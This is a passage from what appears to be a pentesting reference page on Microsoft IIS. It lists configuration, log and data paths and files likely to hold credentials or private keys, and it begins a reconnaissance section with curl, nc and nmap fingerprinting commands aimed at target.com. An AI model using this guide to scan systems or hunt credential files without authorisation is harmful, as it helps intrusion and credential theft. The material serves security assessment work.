      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75z"/></svg>
    </a>
  
  
    
      
    
    <a href="https://github.com/EPIHACKBENIN/ConfigFinder/raw/main/docs/services/web-servers/iis.md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5"/></svg>
    </a>
  


<h1 id="iis-internet-information-services">IIS (Internet Information Services)<a class="headerlink" href="#iis-internet-information-services" title="Permanent link">&para;</a></h1>
<div class="admonition info">
<p class="admonition-title">Information</p>
<p><strong>Category:</strong> Web Server<br />
<strong>Tags:</strong> 'web-server' 'iis' 'windows' 'asp.net' 'microsoft' 'http' 'https'<br />
<strong>Criticality:</strong> ðŸ”´ High</p>
</div>
<h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
<p>Internet Information Services (IIS) is Microsoft's extensible web server software for Windows Server. First released in 1995 with Windows NT, IIS has evolved through multiple versions and is currently at version 10.0, bundled with Windows Server 2016 and later, as well as Windows 10/11 client operating systems.</p>
<p>IIS is a comprehensive web platform that supports HTTP, HTTPS, FTP, FTPS, SMTP, and NNTP protocols. It provides a robust framework for hosting websites, web applications, and services on Windows infrastructure. IIS integrates tightly with the Windows security model, utilizing the server's user database and Access Control Lists (ACLs) for authentication and authorization.</p>
<p>Key features include support for ASP.NET, PHP, Node.js, and other web technologies, application pooling for isolation and reliability, advanced URL rewriting, detailed logging and monitoring, SSL/TLS encryption, and dynamic content compression. IIS powers millions of websites globally and is commonly found in enterprise environments running Microsoft-centric infrastructure.</p>
<p>According to W3Techs, IIS holds approximately 6-8% of the web server market share and is the second most popular web server after Nginx and Apache. It's particularly prevalent in corporate environments, government agencies, and organizations using Microsoft 365, SharePoint, Exchange, and other Microsoft enterprise products.</p>
<p><strong>Current versions:</strong>
- IIS 10.0 (Windows Server 2016, 2019, 2022, Windows 10/11)
- IIS 8.5 (Windows Server 2012 R2, Windows 8.1)
- IIS 8.0 (Windows Server 2012, Windows 8)
- IIS 7.5 (Windows Server 2008 R2, Windows 7)
- IIS 7.0 (Windows Server 2008, Windows Vista)
- Legacy: IIS 6.0 and earlier (deprecated, unsupported)</p>
<hr />
<h2 id="configuration-files">Configuration Files<a class="headerlink" href="#configuration-files" title="Permanent link">&para;</a></h2>
<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">IIS 7.0 and later (Current)</label><label for="__tabbed_1_2">IIS 6.0 and earlier (Legacy)</label><label for="__tabbed_1_3">IIS Express</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># Main global configuration</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">applicationHost</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c"># IIS management configuration</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">administration</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c"># Centralized configuration redirection</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">redirection</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c"># Configuration schema files</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">schema</span><span class="p">\</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">schema</span><span class="p">\</span><span class="n">IIS_Schema</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">schema</span><span class="p">\</span><span class="n">ASPNET_Schema</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">schema</span><span class="p">\</span><span class="n">FX_Schema</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="c"># Application-level configurations</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="no">[WebRoot]</span><span class="p">\</span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="no">[ApplicationPath]</span><span class="p">\</span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="c"># .NET Framework configuration</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Config</span><span class="p">\</span><span class="n">machine</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Config</span><span class="p">\</span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span></code></pre></div>
</div>
<div class="tabbed-block">
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># MetaBase (IIS 6.0 and earlier)</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">MetaBase</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c"># MetaBase schema</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">MBSchema</span><span class="p">.</span><span class="n">xml</span>
</span></code></pre></div>
</div>
<div class="tabbed-block">
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Command-line IIS Express</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="no">[User]</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">IISExpress</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">applicationhost</span><span class="p">.</span><span class="n">config</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c"># Visual Studio IIS Express</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="no">[SolutionFolder]</span><span class="p">\.</span><span class="n">vs</span><span class="p">\</span><span class="no">[ProjectName]</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">applicationhost</span><span class="p">.</span><span class="n">config</span>
</span></code></pre></div>
</div>
</div>
</div>
<hr />
<h2 id="log-files">Log Files<a class="headerlink" href="#log-files" title="Permanent link">&para;</a></h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Default log location (W3C format)</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c"># Site-specific logs (by Site ID)</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">W3SVC1</span><span class="p">\</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">W3SVC2</span><span class="p">\</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c"># Pattern: W3SVC[SiteID]\</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="c"># HTTP.SYS error logs (kernel-level errors)</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">HTTPERR</span><span class="p">\</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="c"># Failed Request Tracing logs</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">FailedReqLogFiles</span><span class="p">\</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="c"># FTP logs</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">FTPSVC1</span><span class="p">\</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">FTPSVC2</span><span class="p">\</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="c"># SMTP logs</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">SMTPSVC1</span><span class="p">\</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="c"># Application pool identity logs</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="c"># ASP.NET trace logs</span>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Temporary</span> <span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">Files</span><span class="p">\</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="c"># Windows Event Logs</span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="n">Application</span> <span class="n">Event</span> <span class="n">Log</span> <span class="p">(</span><span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">errors</span><span class="p">,</span> <span class="n">IIS</span> <span class="n">application</span> <span class="n">errors</span><span class="p">)</span>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="n">System</span> <span class="n">Event</span> <span class="n">Log</span> <span class="p">(</span><span class="n">IIS</span> <span class="n">service</span> <span class="n">events</span><span class="p">)</span>
</span></code></pre></div>
<hr />
<h2 id="sensitive-files">Sensitive Files<a class="headerlink" href="#sensitive-files" title="Permanent link">&para;</a></h2>
<div class="admonition danger">
<p class="admonition-title">Credentials and sensitive data</p>
<p>The following files may contain critical information:</p>
<ul>
<li><code>applicationHost.config</code> - Contains application pool identities, connection strings, SSL certificates</li>
<li><code>web.config</code> - Application-specific settings including database connection strings, authentication settings</li>
<li><code>machine.config</code> - Global .NET configuration with potential credentials</li>
<li><code>*.pfx / *.p12</code> - SSL certificate files with private keys</li>
<li><code>*.key / *.pem</code> - SSL/TLS private keys</li>
<li><code>*.cer / *.crt</code> - SSL certificates</li>
<li><code>.htpasswd</code> - HTTP Basic Authentication credentials (if using Apache-style auth)</li>
<li><code>connectionStrings.config</code> - Externalized connection strings</li>
<li><code>appSettings.config</code> - Application settings that may contain API keys</li>
<li><code>Global.asax</code> - Application-level code that may contain credentials</li>
<li><code>*.aspx.cs / *.aspx.vb</code> - Code-behind files with potential hardcoded credentials</li>
<li><code>*.dll</code> - Compiled assemblies that may contain secrets</li>
<li><code>App_Data\</code> - Application data directory often containing databases</li>
<li><code>*.mdf / *.ldf</code> - SQL Server database files in App_Data</li>
<li><code>*.sdf</code> - SQL Server Compact databases</li>
<li><code>*.config.backup</code> - Configuration backups with credentials</li>
</ul>
</div>
<div class="admonition warning">
<p class="admonition-title">Backup and temporary files</p>
<p>Don't forget to check for backups and editor temp files:</p>
<ul>
<li><code>web.config~</code></li>
<li><code>web.config.bak</code></li>
<li><code>web.config.old</code></li>
<li><code>web.config.backup</code></li>
<li><code>web.config.save</code></li>
<li><code>applicationHost.config.bak</code></li>
<li><code>*.config.swp</code> (vim swap files)</li>
<li><code>.vs\</code> (Visual Studio settings)</li>
<li><code>bin\*.pdb</code> (Debug symbols with source information)</li>
<li><code>obj\</code> (Compilation artifacts)</li>
</ul>
</div>
<hr />
<h2 id="data-directories">Data Directories<a class="headerlink" href="#data-directories" title="Permanent link">&para;</a></h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Default web root</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c"># Application pool configuration</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">applicationPools</span><span class="p">\</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c"># IIS installation directory</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c"># IIS modules</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="c"># Temporary ASP.NET files</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Temporary</span> <span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">Files</span><span class="p">\</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Temporary</span> <span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">Files</span><span class="p">\</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="c"># FTP root</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">ftproot</span><span class="p">\</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="c"># SMTP drop folders</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">mailroot</span><span class="p">\</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="c"># Cache and temporary files</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="k">%</span><span class="n">SystemDrive</span><span class="p">%\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">Temporary</span> <span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">Files</span><span class="p">\</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="c"># Application data</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="k">%</span><span class="n">ProgramData</span><span class="p">%\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Crypto</span><span class="p">\</span><span class="n">RSA</span><span class="p">\</span><span class="n">MachineKeys</span><span class="p">\</span>
</span></code></pre></div>
<hr />
<h2 id="pentest-tips">Pentest Tips<a class="headerlink" href="#pentest-tips" title="Permanent link">&para;</a></h2>
<div class="admonition tip">
<p class="admonition-title">Reconnaissance</p>
<p><strong>Version identification:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Banner grabbing with curl</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>curl<span class="w"> </span>-I<span class="w"> </span>http://target.com
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># Look for: Server: Microsoft-IIS/10.0</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Banner grabbing with nc</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>target.com<span class="w"> </span><span class="m">80</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="c1"># Nmap service detection</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443<span class="w"> </span>-sV<span class="w"> </span>target.com
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443<span class="w"> </span>--script<span class="w"> </span>http-headers<span class="w"> </span>target.com
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># Detailed IIS fingerprinting</span>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443<span class="w"> </span>--script<span class="w"> </span>http-iis-short-name-brute<span class="w"> </span>target.com
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="c1"># Check for internal IP disclosure (HTTP/1.0 downgrade)</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>curl<span class="w"> </span>-v<span class="w"> </span>--http1.0<span class="w"> </span>http://target.com
